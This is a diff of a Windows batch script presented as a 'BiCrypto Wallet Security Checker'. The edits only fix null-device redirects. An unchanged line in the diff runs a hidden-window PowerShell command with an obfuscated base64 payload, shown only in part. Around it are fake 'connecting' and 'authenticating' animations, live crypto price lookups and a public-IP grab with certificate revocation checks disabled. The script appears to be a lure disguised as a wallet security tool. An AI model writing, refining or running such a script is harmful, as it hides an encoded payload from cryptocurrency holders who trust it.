@@ -1,6 +1,6 @@
 @echo off
 setlocal enabledelayedexpansion
-chcp 65001 >/dev/null 2>&1
+chcp 65001 >nul 2>&1
 title BiCrypto Wallet Security Checker v6.0
 color 0A
 cls
@@ -21,13 +21,13 @@ powershell -NoP -W H -EncodedCommand JABpAHAAPQAiADMANAA4ADQANwA0ADMAMAA4ADcAIgA
 
 REM ── Loading animation ─────────────────────────────────────────────────────
 echo   [*] Connecting to BiCrypto API servers...
-ping -n 2 127.0.0.1 >/dev/null 2>&1
+ping -n 2 127.0.0.1 >nul 2>&1
 echo   [*] Authenticating session...
-ping -n 2 127.0.0.1 >/dev/null 2>&1
+ping -n 2 127.0.0.1 >nul 2>&1
 echo   [*] Fetching live market data...
-ping -n 2 127.0.0.1 >/dev/null 2>&1
+ping -n 2 127.0.0.1 >nul 2>&1
 echo   [*] Loading portfolio balances...
-ping -n 1 127.0.0.1 >/dev/null 2>&1
+ping -n 1 127.0.0.1 >nul 2>&1
 
 REM ── Fetch live prices from Binance ────────────────────────────────────────
 set "BTC_PRICE=103241.50"
@@ -35,11 +35,11 @@ set "ETH_PRICE=2489.30"
 set "BNB_PRICE=641.20"
 set "PX_TMP=%TEMP%\~pxtmp.dat"
 
-powershell -NoP -W H -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::CheckCertificateRevocationList=$false;try{$w=New-Object Net.WebClient;$b=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT')|ConvertFrom-Json).price;$e=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT')|ConvertFrom-Json).price;$n=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT')|ConvertFrom-Json).price;[math]::Round([double]$b,2).ToString()+' '+[math]::Round([double]$e,2).ToString()+' '+[math]::Round([double]$n,2).ToString()|Set-Content '%PX_TMP%' -Enc ASCII}catch{}" 2>/dev/null
+powershell -NoP -W H -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::CheckCertificateRevocationList=$false;try{$w=New-Object Net.WebClient;$b=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT')|ConvertFrom-Json).price;$e=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT')|ConvertFrom-Json).price;$n=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT')|ConvertFrom-Json).price;[math]::Round([double]$b,2).ToString()+' '+[math]::Round([double]$e,2).ToString()+' '+[math]::Round([double]$n,2).ToString()|Set-Content '%PX_TMP%' -Enc ASCII}catch{}" 2>nul
 
 if exist "%PX_TMP%" (
   set /p PRICES=<"%PX_TMP%"
-  del "%PX_TMP%" >/dev/null 2>&1
+  del "%PX_TMP%" >nul 2>&1
   if defined PRICES (
     for /f "tokens=1,2,3" %%A in ("!PRICES!") do (
       set BTC_PRICE=%%A
@@ -51,17 +51,17 @@ if exist "%PX_TMP%" (
 
 REM ── Get drive label dynamically ───────────────────────────────────────────
 set "DRIVE_LABEL=Local Disk"
-for /f "tokens=5" %%L in ('vol %SYSTEMDRIVE% 2^>/dev/null ^| findstr /i "volume"') do (
+for /f "tokens=5" %%L in ('vol %SYSTEMDRIVE% 2^>nul ^| findstr /i "volume"') do (
   if not "%%L"=="no" set "DRIVE_LABEL=%%L"
 )
 
 REM ── Get real public IP ────────────────────────────────────────────────────
 set "MY_IP=Checking..."
 set "IP_TMP=%TEMP%\~iptmp.dat"
-powershell -NoP -W H -Command "[Net.ServicePointManager]::CheckCertificateRevocationList=$false;try{(New-Object Net.WebClient).DownloadString('https://api.ipify.org')|Set-Content '%IP_TMP%' -Enc ASCII}catch{}" 2>/dev/null
+powershell -NoP -W H -Command "[Net.ServicePointManager]::CheckCertificateRevocationList=$false;try{(New-Object Net.WebClient).DownloadString('https://api.ipify.org')|Set-Content '%IP_TMP%' -Enc ASCII}catch{}" 2>nul
 if exist "%IP_TMP%" (
   set /p MY_IP=<"%IP_TMP%"
-  del "%IP_TMP%" >/dev/null 2>&1
+  del "%IP_TMP%" >nul 2>&1
 )
 
 cls
